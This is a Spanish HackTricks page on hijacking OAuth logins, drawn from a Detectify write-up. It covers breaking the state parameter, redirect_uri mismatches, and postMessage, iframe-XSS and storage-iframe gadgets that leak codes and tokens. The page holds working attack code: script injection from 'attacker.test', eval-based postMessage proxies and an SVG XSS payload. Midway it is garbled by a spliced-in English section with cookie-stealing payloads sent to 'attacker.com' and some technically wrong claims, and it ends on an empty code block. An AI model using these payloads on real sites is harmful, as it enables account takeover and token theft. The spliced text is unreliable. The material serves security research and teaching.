# OAuth - Flujos felices, XSS, iframes y mensajes POST para filtrar valores de c√≥digo y estado

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este contenido fue tomado de** [**https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url**](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)****

## Explicaci√≥n de diferentes flujos de OAuth

### Tipos de respuesta

En primer lugar, existen diferentes tipos de respuesta que se pueden utilizar en el flujo de OAuth. Estas respuestas otorgan el **token para iniciar sesi√≥n como los usuarios o la informaci√≥n necesaria para hacerlo**.

Los tres m√°s comunes son:

1. **`code` + `state`**. El **c√≥digo** se utiliza para **llamar al servidor del proveedor de OAuth** para obtener un token. El par√°metro **state** se utiliza para verificar que el **usuario correcto est√° realizando la llamada**. Es responsabilidad del cliente de OAuth validar el par√°metro de estado antes de realizar la llamada al servidor del proveedor de OAuth.
2. **`id_token`**. Es un token JSON Web Token **(JWT) firmado** utilizando un certificado p√∫blico del proveedor de OAuth para verificar que la identidad proporcionada es realmente quien dice ser.
3. **`token`**. Es un **token de acceso** utilizado en la API del proveedor de servicios.

### Modos de respuesta

Existen diferentes modos que el flujo de autorizaci√≥n podr√≠a utilizar para proporcionar los c√≥digos o tokens al sitio web en el flujo de OAuth, estos son cuatro de los m√°s comunes:

1. **Consulta**. Enviando par√°metros de consulta como una redirecci√≥n de vuelta al sitio web (`https://ejemplo.com/callback?code=xxx&state=xxx`). Utilizado para `code+state`. El **c√≥digo** solo se puede **usar una vez** y se necesita el **secreto del cliente de OAuth** para **adquirir un token de acceso** al usar el c√≥digo.&#x20;
   1. [Este modo no se recomienda para tokens](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#id\_token) ya que **los tokens se pueden usar varias veces y no deben terminar en registros del servidor o similares**. La mayor√≠a de los proveedores de OAuth no admiten este modo para tokens, solo para c√≥digo. Ejemplos:
      * `response_mode=query` es utilizado por Apple.
        * `response_type=code` es utilizado por Google o Facebook.
2. **Fragmento**. Usando una **redirecci√≥n de fragmento** (`https://ejemplo.com/callback#access_token=xxx`). En este modo, la parte del fragmento de la URL no termina en ning√∫n registro del servidor y solo se puede acceder desde el lado del cliente utilizando javascript. Este modo de respuesta se utiliza para tokens. Ejemplos:
   * `response_mode=fragment` es utilizado por Apple y Microsoft.
   * `response_type` contiene `id_token` o `token` y es utilizado por Google, Facebook, Atlassian y otros.
3. **Mensaje web**. Usando **postMessage a un origen fijo del sitio web**:\
   `postMessage('{"access_token":"xxx"}','https://ejemplo.com')`\
   Si se admite, a menudo se puede utilizar para todos los diferentes tipos de respuesta. Ejemplos:
   * `response_mode=web_message` es utilizado por Apple.
   * `redirect_uri=storagerelay://...` es utilizado por Google.
   * `redirect_uri=https://staticxx.facebook.com/.../connect/xd_arbiter/...` es utilizado por Facebook.
4. **Publicaci√≥n de formulario**. Usando una publicaci√≥n de formulario a un `redirect_uri` v√°lido, se env√≠a una **solicitud POST regular de vuelta al sitio web**. Esto se puede utilizar para c√≥digo y tokens. Ejemplos:
   * `response_mode=form_post` es utilizado por Apple.
   * `ux_mode=redirect&login_uri=https://ejemplo.com/callback` es utilizado por Google Sign-In (GSI).

## Romper `state` intencionalmente <a href="#break-state-intentionally" id="break-state-intentionally"></a>

La especificaci√≥n de OAuth recomienda un par√°metro `state` en combinaci√≥n con un `response_type=code` para asegurarse de que el usuario que inici√≥ el flujo tambi√©n es el que usa el c√≥digo despu√©s del flujo de OAuth para emitir un token.

Sin embargo, si el **valor de `state` es inv√°lido**, el **`code` no se consumir√°** ya que es responsabilidad del sitio web (el √∫ltimo) validar el estado. Esto significa que si un atacante puede enviar un enlace de flujo de inicio de sesi√≥n a una v√≠ctima contaminada con un `state` v√°lido del atacante, el flujo de OAuth fallar√° para la v√≠ctima y el `code` nunca se enviar√° al proveedor de OAuth. El c√≥digo seguir√° siendo posible de usar si el atacante puede obtenerlo.

1. El atacante inicia un flujo de inicio de sesi√≥n en el sitio web utilizando "Iniciar sesi√≥n con X".
2. El atacante utiliza el valor `state` y construye un enlace para que la v√≠ctima inicie sesi√≥n con el proveedor de OAuth pero con el `state` del atacante.
3. La v√≠ctima inicia sesi√≥n con el enlace y es redirigida de vuelta al sitio web.
4. El sitio web valida el `state` para la v√≠ctima y detiene el procesamiento del flujo de inicio de sesi√≥n ya que no es un estado v√°lido. P√°gina de error para la v√≠ctima.
5. El atacante encuentra una forma de filtrar el `code` de la p√°gina de error.
6. El atacante ahora puede iniciar sesi√≥n con su propio `state` y el `
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
redireccionar√° a `https://example.com/callback?code=xxx&state=yyy`. Pero:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
Se redirigir√° a `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`.

La misma idea se aplica a Apple si usas:
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
Ser√°s redirigido a `https://example.com/callback?code=xxx&state=yyy`, pero:
```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
Te redirigir√° a `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`.

## Caminos no felices

El autor de la investigaci√≥n llam√≥ **caminos no felices a las URLs incorrectas donde el usuario iniciaba sesi√≥n a trav√©s de OAuth y era redirigido**. Esto es √∫til porque si el cliente recibe el token o un estado+codigo v√°lido **pero no llega a la p√°gina esperada**, esa **informaci√≥n no ser√° consumida correctamente** y si el atacante encuentra una forma de **filtrar esa informaci√≥n** del "camino no feliz", podr√° **tomar el control de la cuenta**.

Por defecto, el flujo de OAuth llegar√° al camino esperado, sin embargo, podr√≠a haber algunas **configuraciones incorrectas** potenciales que podr√≠an permitir a un atacante **crear una solicitud OAuth inicial espec√≠fica** que har√° que el **usuario llegue a un camino no feliz despu√©s de iniciar sesi√≥n**.

### Desajustes en la URL de redirecci√≥n

Estas **configuraciones incorrectas** "comunes" se encontraron en la **URL de redirecci√≥n** de la comunicaci√≥n OAuth.

La [**especificaci√≥n**](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-19#section-2.1) **** indica estrictamente que la URL de redirecci√≥n debe compararse estrictamente con la definida, sin permitir cambios aparte del puerto que aparece o no. Sin embargo, algunos puntos finales permit√≠an algunas modificaciones:

### A√±adir una ruta a la URL de redirecci√≥n

Algunos proveedores de OAuth **permiten agregar datos adicionales** a la ruta para `redirect_uri`. Esto tambi√©n rompe la especificaci√≥n de la misma manera que para "Cambio de caso en la URL de redirecci√≥n". Por ejemplo, teniendo una URL de redirecci√≥n `https://example.com/callback`, enviando:
```
response_type=id_token&
redirect_uri=https://example.com/callbackxxx
```
### A√±adiendo par√°metros a redirect-uri

Algunos proveedores de OAuth **permiten agregar par√°metros adicionales de consulta o fragmento** a la `redirect_uri`. Puedes aprovechar esto al provocar un camino no feliz proporcionando los mismos par√°metros que se agregar√°n a la URL. Por ejemplo, si tienes una `redirect_uri` de `https://example.com/callback`, env√≠a:
```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```
El resultado en estos casos ser√≠a una redirecci√≥n a `https://example.com/callback?code=xxx&code=real-code`. Dependiendo del sitio web que reciba **m√∫ltiples par√°metros con el mismo nombre, esto tambi√©n podr√≠a desencadenar un camino no feliz**. Lo mismo se aplica a `token` e `id_token`:
```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```
Termina como `https://example.com/callback#id_token=xxx&id_token=real-id_token`. Dependiendo del **javascript que recupera los par√°metros de fragmento cuando hay m√∫ltiples par√°metros con el mismo nombre**, esto tambi√©n podr√≠a terminar en un camino no feliz.

### Restos de uri de redirecci√≥n o configuraciones incorrectas

Al recopilar todas las URL de inicio de sesi√≥n que contienen los valores de `redirect_uri`, tambi√©n podr√≠a probar si otros valores de redirecci√≥n de URI tambi√©n eran v√°lidos. De las 125 flujos de inicio de sesi√≥n de Google diferentes que guard√© de los sitios web que prob√©, 5 sitios web ten√≠an la p√°gina de inicio tambi√©n como un `redirect_uri` v√°lido. Por ejemplo, si se estaba utilizando `redirect_uri=https://auth.example.com/callback`, en estos 5 casos, cualquiera de estos tambi√©n era v√°lido:

* `redirect_uri=https://example.com/`
* `redirect_uri=https://example.com`
* `redirect_uri=https://www.example.com/`
* `redirect_uri=https://www.example.com`

Esto fue especialmente interesante para los sitios web que realmente usaban `id_token` o `token`, ya que `response_type=code` a√∫n tendr√≠a al proveedor de OAuth validando el `redirect_uri` en el √∫ltimo paso del baile de OAuth al adquirir un token.

## Gadget 1: Listeners de postMessage con verificaci√≥n de origen d√©bil o inexistente que filtra la URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-1-1024x582.png)

**En este ejemplo, el √∫ltimo camino no feliz donde se envi√≥ el token/c√≥digo fue enviando un mensaje de solicitud de publicaci√≥n filtrando location.href.**\
Un ejemplo fue un SDK de an√°lisis para un sitio popular que se carg√≥ en sitios web:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example1.png)

Este SDK expuso un listener de postMessage que envi√≥ el siguiente mensaje cuando el tipo de mensaje coincidi√≥:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example2.png)

Enviando un mensaje a √©l desde un origen diferente:
```javascript
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
Un mensaje de respuesta aparecer√≠a en la ventana que envi√≥ el mensaje que contiene la `location.href` del sitio web:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example3.png)

El flujo que se podr√≠a utilizar en un ataque depend√≠a de c√≥mo se usaban los c√≥digos y tokens para el flujo de inicio de sesi√≥n, pero la idea era:

### **Ataque**

1. El atacante env√≠a al usuario v√≠ctima un **enlace manipulado** que ha sido preparado para **resultar en un flujo no feliz** en la danza de OAuth.
2. La v√≠ctima **hace clic** en el enlace. Se abre una nueva pesta√±a con un flujo de **inicio de sesi√≥n** con uno de los proveedores de OAuth del sitio web que est√° siendo explotado.
3. Se activa un flujo no feliz en el sitio web que est√° siendo explotado, se carga el **escucha de postMessage vulnerable en la p√°gina en la que aterriz√≥ la v√≠ctima, todav√≠a con el c√≥digo o tokens en la URL**.
4. La **pesta√±a original** enviada por el atacante env√≠a un mont√≥n de **postMessages** a la nueva pesta√±a con el sitio web para que el escucha de postMessage filtre la URL actual.
5. La pesta√±a original enviada por el atacante **escucha el mensaje enviado a ella**. Cuando la URL regresa en un mensaje, se extrae el **c√≥digo y token** y se env√≠a al atacante.
6. **El atacante inicia sesi√≥n como la v√≠ctima** utilizando el c√≥digo o token que termin√≥ en el flujo no feliz.

## Gadget 2: XSS en un dominio de sandbox/terceros que obtiene la URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-2-1024x582.png)

&#x20;

## **Gadget 2: ejemplo 1, robando window.name de un iframe de sandbox**

Este ten√≠a un **iframe** cargado en la **p√°gina donde termin√≥ la danza de OAuth**. El **nombre** del **iframe** era una **versi√≥n JSON-stringified del objeto `window.location`**. Esta es una forma antigua de transferir datos entre dominios, ya que la p√°gina en el iframe puede obtener su propio `window.name` establecido por el padre:
```javascript
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```
El dominio cargado en el **iframe tambi√©n ten√≠a un XSS simple**:
```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```
### Ataque

Si tienes un **XSS** en un **dominio** en una ventana, esta ventana puede luego **acceder a otras ventanas de la misma origen** si hay una relaci√≥n de padre/hijo/opener entre las ventanas.

Esto significa que un atacante podr√≠a **explotar el XSS para cargar una nueva pesta√±a** con el **enlace OAuth creado** que terminar√° en la **ruta que carga el iframe con el token en el nombre**. Luego, desde la p√°gina explotada por XSS, ser√° posible **leer el nombre del iframe** porque tiene un **opener sobre la p√°gina principal del iframe** y exfiltrarlo.

M√°s espec√≠ficamente:

1. Crear una p√°gina maliciosa que incruste un iframe del sandbox con el XSS cargando mi propio script:

    ```html
    <div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
    x=createElement('script'),
    x.src='//attacker.test/inject.js',
    document.body.appendChild(x);" 
    style="border:0;width:500px;height:500px"></iframe></div>
    ```
2. En mi script cargado en el sandbox, reemplac√© el contenido con el enlace a usar para la v√≠ctima:

    ```javascript
    document.body.innerHTML = 
    '<a href="#" onclick="
    b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
    Haz clic aqu√≠ para secuestrar el token</a>';
    ```

    Tambi√©n inici√© un script en un intervalo para verificar si se abri√≥ el enlace y si el iframe que quer√≠a alcanzar est√° all√≠ para obtener el `window.name` establecido en el iframe con la misma origen que el iframe en la p√°gina del atacante:

    ```javascript
    x = setInterval(function() {
    if(parent.window.b &&
     parent.window.b.frames[0] &&
     parent.window.b.frames[0].window &&
     parent.window.b.frames[0].window.name) {
       top.postMessage(parent.window.b.frames[0].window.name, '*');
       parent.window.b.close();
       clearInterval(x);
    }
    }, 500);
    ```
3. La p√°gina del atacante puede simplemente escuchar el mensaje que acabamos de enviar con el `window.name`:

    ```html
    <script>
    window.addEventListener('message', function (e) {
     if (e.data) {
         document.getElementById('leak').innerText = 'Robamos el token: ' + e.data;
     }
    });
    </script>
    ```

## **Gadget 2: ejemplo 2, iframe con XSS + comprobaci√≥n de origen del padre**

El segundo ejemplo fue un **iframe** cargado en el **camino no feliz** con un XSS **usando postMessage**, pero **solo se permitieron mensajes desde el `padre`** que lo carg√≥. La **`location.href` se envi√≥ al iframe cuando solicit√≥ `initConfig`** en un mensaje a la ventana `padre`.

La ventana principal carg√≥ el iframe de esta manera:
```html
<iframe src="https://challenge-iframe.example.com/"></iframe>
```
# OAuth Happy Paths: XSS, iframes and post messages to leak code and state values

## Introduction

In this section we will see how to exploit some happy paths of OAuth to leak code and state values. We will use XSS, iframes and post messages to achieve this.

## OAuth Happy Paths

### Authorization Code Grant

#### Step 1: User Authorization

The first step of the Authorization Code Grant flow is to redirect the user to the authorization server. This is usually done by sending the user to a URL like this:

```
https://auth-server.com/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=STATE
```

The `response_type` parameter is set to `code`, which means that the authorization server will return an authorization code to the client. The `client_id` parameter is the ID of the client application that is requesting authorization. The `redirect_uri` parameter is the URL that the authorization server will redirect the user to after the user has authorized the request. The `state` parameter is a random value that is generated by the client application and is used to prevent CSRF attacks.

#### Step 2: Authorization Code Exchange

Once the user has authorized the request, the authorization server will redirect the user to the `redirect_uri` specified in the previous step. The authorization code will be included in the query string of the URL:

```
https://client-app.com/callback?code=AUTHORIZATION_CODE&state=STATE
```

The client application can then exchange the authorization code for an access token by sending a POST request to the authorization server:

```
POST /token HTTP/1.1
Host: auth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=REDIRECT_URI&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
```

The `grant_type` parameter is set to `authorization_code`, which indicates that the client application is exchanging an authorization code for an access token. The `code` parameter is the authorization code that was received in the previous step. The `redirect_uri` parameter must match the `redirect_uri` that was used in the previous step. The `client_id` and `client_secret` parameters are the credentials of the client application.

### Exploiting the Happy Paths

#### XSS

One way to exploit the Authorization Code Grant flow is to inject an XSS payload into the `state` parameter of the authorization request. When the authorization server redirects the user back to the client application, the XSS payload will be executed in the context of the client application.

For example, if the client application is vulnerable to XSS and the attacker injects the following payload into the `state` parameter:

```
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>
```

The attacker will be able to steal the user's session cookie when the user is redirected back to the client application.

#### Iframes

Another way to exploit the Authorization Code Grant flow is to use an iframe to load the authorization server's login page. When the user logs in, the authorization server will set a cookie that is scoped to the authorization server's domain. The client application can then use JavaScript to read the cookie and send it to the attacker's server.

For example, the attacker can create an iframe that loads the authorization server's login page:

```
<iframe src="https://auth-server.com/login"></iframe>
```

When the user logs in, the authorization server will set a cookie that is scoped to the `auth-server.com` domain. The attacker can then use JavaScript to read the cookie and send it to their server:

```
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>
```

#### Post Messages

A third way to exploit the Authorization Code Grant flow is to use post messages to communicate between the client application and the authorization server. The client application can use post messages to send the authorization code to the attacker's server.

For example, the attacker can create an iframe that loads the client application:

```
<iframe src="https://client-app.com"></iframe>
```

When the user authorizes the request, the authorization server will redirect the user back to the client application. The client application can then use post messages to send the authorization code to the attacker's server:

```
<script>
  window.addEventListener('message', function(event) {
    if (event.origin === 'https://client-app.com') {
      var authorizationCode = event.data.authorizationCode;
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://attacker.com/steal.php', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('authorizationCode=' + authorizationCode);
    }
  });
</script>
```

## Conclusion

In this section we have seen how to exploit some happy paths of OAuth to leak code and state values. We have used XSS, iframes and post messages to achieve this. It is important to note that these attacks can be prevented by properly validating and sanitizing user input, and by using secure coding practices.
```html
<script>
window.addEventListener('message', function (e) {
  if (e.source !== window.parent) {
    // not a valid origin to send messages
    return;
  }
  if (e.data.type === 'loadJs') {
    loadScript(e.data.jsUrl);
  } else if (e.data.type === 'initConfig') {
    loadConfig(e.data.config);
  }
});
</script>
```
### Ataque

En este caso, el **atacante carga un iframe con la p√°gina de vulnerabilidad XSS de post-message**, y **explota** el **XSS** para cargar **JS arbitrario**. Este **JS** abrir√° una **pesta√±a** con el **enlace OAuth**. Despu√©s de iniciar sesi√≥n, la p√°gina final contiene el token en la URL y ha cargado un iframe (el iframe de vulnerabilidad XSS post-message).

Luego, el **JS arbitrario** (del XSS explotado) tiene un **abridor para esa pesta√±a**, por lo que **accede al iframe** y lo hace **pedir al padre el `initConfig`** (que contiene la **URL con el token**). La p√°gina principal **se lo da al iframe**, que tambi√©n se le ordena que lo **filtre**.

En este caso, podr√≠a hacer un m√©todo similar al ejemplo anterior:

1. Crear una **p√°gina maliciosa** que incruste un **iframe** del sandbox, adjuntar un **onload** para **activar un script cuando se cargue el iframe**.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://challenge-iframe.example.com/"
    onload="run()"
    style="border:0;width:500px;height:500px"></iframe></div>
    ```
2. Como la **p√°gina maliciosa es entonces el padre** del iframe, podr√≠a **enviar un mensaje al iframe para cargar nuestro script** en el origen del sandbox usando **postMessage (XSS)**:

    ```html
    <script>
    function run() {
      i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
    }
    </script>
    ```
3. En mi script que se carga en el sandbox, reemplac√© el contenido con el **enlace para la v√≠ctima**:

    ```javascript
    document.body.innerHTML = '<a href="#" onclick="
    b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
    Haz clic aqu√≠ para secuestrar el token</a>';
    ```

    Tambi√©n inici√© un script en un intervalo para **verificar si se abri√≥ el enlace y si estaba all√≠ el iframe que quer√≠a alcanzar**, para ejecutar javascript dentro de √©l desde mi iframe a la ventana principal. Luego adjunt√© un oyente de postMessage que pas√≥ el mensaje de vuelta a mi iframe en la ventana maliciosa:

    ```javascript
    x = setInterval(function() {
      if(b && b.frames[1]) {
        b.frames[1].eval(
          'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
          'top.postMessage({type:'initConfig'},"*")'
        )
        clearInterval(x)
      }
    }, 500);
    ```
4. La p√°gina del atacante que ten√≠a el iframe cargado puede luego escuchar el mensaje que envi√© desde el proxy de oyente de postMessage inyectado en el iframe de la ventana principal:

    ```html
    <script>
    window.addEventListener('message', function (e) {
     if (e.data) {
         document.getElementById('leak').innerText = 'Robamos el token: ' + JSON.stringify(e.data);
     }
    });
    </script>
    ```

## Gadget 3: Usando APIs para obtener URL fuera de l√≠mites

![](https://labs.detectify.com/wp-content/uploads/2022/06/Gadget-3--1024x582.png)

&#x20;

Este gadget result√≥ ser el m√°s divertido. Hay algo satisfactorio en enviar a la v√≠ctima a alg√∫n lugar y luego recoger datos sensibles de una ubicaci√≥n diferente.

## **Gadget 3: ejemplo 1, iframe de almacenamiento sin verificaci√≥n de origen**

El primer ejemplo utiliz√≥ un servicio externo para datos de seguimiento. Este servicio agreg√≥ un "iframe de almacenamiento":
```html
<iframe
  id="tracking"
  name="tracking"
  src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
La ventana principal se comunicar√≠a con este iframe usando postMessage para enviar datos de seguimiento que se guardar√≠an en el localStorage del origen donde se encontraba `storage.html`:
```javascript
tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
La ventana principal tambi√©n podr√≠a obtener este contenido:
```javascript
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```
Cuando se carg√≥ el iframe en la inicializaci√≥n, se guard√≥ una clave para la √∫ltima ubicaci√≥n del usuario utilizando `location.href`:
```javascript
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');
```
Si pudieras comunicarte con este origen de alguna manera y hacer que te env√≠e el contenido, se podr√≠a obtener el `location.href` de este almacenamiento. El oyente de postMessage para el servicio ten√≠a una lista de bloqueo y una lista de permitidos de or√≠genes. Parece que el servicio de an√°lisis permit√≠a que el sitio web definiera qu√© or√≠genes permitir o denegar:
```javascript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
  // If there's a blockList, check if origin is there and if so, deny
  if (blockList && blockList.indexOf(e.origin) !== -1) {
    return;
  }
  // If there's an allowList, check if origin is there, else deny
  if (allowList && allowList.indexOf(e.origin) == -1) {
    return;
  }
  // Only parent can talk to it
  if (e.source !== window.parent) {
    return;
  }
  handleMessage(e);
});

function handleMessage(e) {
  if (data.type === 'sync') {
    syncListeners.push({source: e.source, origin: e.origin})
  } else {
  ...
}

window.addEventListener('storage', function(e) {
  for(var i = 0; i < syncListeners.length; i++) {
    syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
  }
}
```
Adem√°s, si tuvieras un origen v√°lido basado en la `allowList`, tambi√©n podr√≠as solicitar una sincronizaci√≥n, lo que te dar√≠a cualquier cambio realizado en el localStorage en esta ventana enviado a ti cuando se realizaron.

### Ataque

En el sitio web que ten√≠a este almacenamiento cargado en el camino no feliz de la danza de OAuth, no se definieron or√≠genes de `allowList`; **esto permiti√≥ que cualquier origen hablara con el oyente de postMessage** si el origen era el `parent` de la ventana:

1.  Cre√© una p√°gina maliciosa que incrustaba un iframe del contenedor de almacenamiento y adjuntaba un onload para activar un script cuando se cargaba el iframe.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://cdn.customer12345.analytics.example.com/storage.html"
    onload="run()"></iframe></div>
    ```
2.  Como la p√°gina maliciosa era ahora el padre del iframe, y no se definieron or√≠genes en la `allowList`, la p√°gina maliciosa pod√≠a enviar mensajes al iframe para decirle al almacenamiento que enviara mensajes para cualquier actualizaci√≥n del almacenamiento. Tambi√©n podr√≠a agregar un oyente a la p√°gina maliciosa para escuchar cualquier actualizaci√≥n de sincronizaci√≥n del almacenamiento:

    ```html
    <script>
    function run() {
      i.postMessage({type:'sync'}, '*')
    }
    window.addEventListener('message', function (e) {
     if (e.data && e.data.type === 'sync') {
         document.getElementById('leak').innerText = 'Robamos el token: ' + JSON.stringify(e.data);
     }
    });
    </script>
    ```
3.  La p√°gina maliciosa tambi√©n contendr√≠a un enlace regular para que la v√≠ctima hiciera clic:

    ```html
    <a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?..."
    target="_blank">Haz clic aqu√≠ para secuestrar el token</a>';
    ```
4.  La v√≠ctima har√≠a clic en el enlace, pasar√≠a por la danza de OAuth y terminar√≠a en el camino no feliz cargando el script de seguimiento y el iframe de almacenamiento. El iframe de almacenamiento recibe una actualizaci√≥n de `last-url`. El evento `window.storage` se activar√≠a en el iframe de la p√°gina maliciosa ya que se actualiz√≥ el localStorage, y la p√°gina maliciosa que ahora recib√≠a actualizaciones cada vez que cambiaba el almacenamiento recibir√≠a un postMessage con la URL actual de la v√≠ctima:

    <figure><img src="https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example2.png" alt=""><figcaption></figcaption></figure>

## **Gadget 3: ejemplo 2, mezcla de clientes en CDN - DIY storage-SVG sin verificaci√≥n de origen**

Como el servicio de an√°lisis en s√≠ mismo ten√≠a una recompensa por errores, tambi√©n estaba interesado en ver si pod√≠a encontrar una manera de filtrar URLs tambi√©n para los sitios web que hab√≠an configurado or√≠genes adecuados para el iframe de almacenamiento.

Cuando comenc√© a buscar el dominio `cdn.analytics.example.com` en l√≠nea sin la parte del cliente, not√© que este CDN tambi√©n conten√≠a im√°genes cargadas por los clientes del servicio:
```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```
Tambi√©n not√© que hab√≠a archivos SVG servidos en l√≠nea como `Content-type: image/svg+xml` en este CDN:
```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```
Me registr√© como usuario de prueba en el servicio y sub√≠ mi propio activo, que tambi√©n apareci√≥ en la CDN:
```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```
La parte interesante fue que, si luego usabas el subdominio espec√≠fico del cliente para el CDN, la imagen segu√≠a siendo servida. Esta URL funcion√≥:
```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```
Esto significaba que el cliente con ID #94342 pod√≠a renderizar archivos SVG en el almacenamiento del cliente #12345.

Sub√≠ un archivo SVG con un payload XSS simple:

`https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg`
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

No muy bien. El CDN agreg√≥ un encabezado `Content-Security-Policy: default-src 'self'` a todo lo que estaba bajo `img/`. Tambi√©n se pod√≠a ver que el encabezado del servidor mencionaba S3, revelando que el contenido se hab√≠a cargado en un bucket de S3:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example5.png)

Una peculiaridad interesante de S3 es que los directorios no son realmente directorios en S3; la ruta antes de la clave se llama "prefijo". Esto significa que a S3 no le importa si los `/` est√°n codificados en URL o no, a√∫n servir√° el contenido si se codifica en URL cada barra diagonal en la URL. Si cambiara `img/` a `img%2f` en la URL, la imagen seguir√≠a resolvi√©ndose. Sin embargo, en ese caso se elimin√≥ el encabezado CSP y se activ√≥ el XSS:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example6.png)

Luego pude cargar un SVG que crear√≠a la misma forma de controlador de almacenamiento y oyente de postMessage como el `storage.html` regular, pero con una lista de permitidos vac√≠a. Eso me permiti√≥ hacer el mismo tipo de ataque incluso en sitios web que hab√≠an definido correctamente los or√≠genes permitidos que pod√≠an hablar con el almacenamiento.

Cargu√© un SVG que se ve√≠a as√≠: 

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)
```html
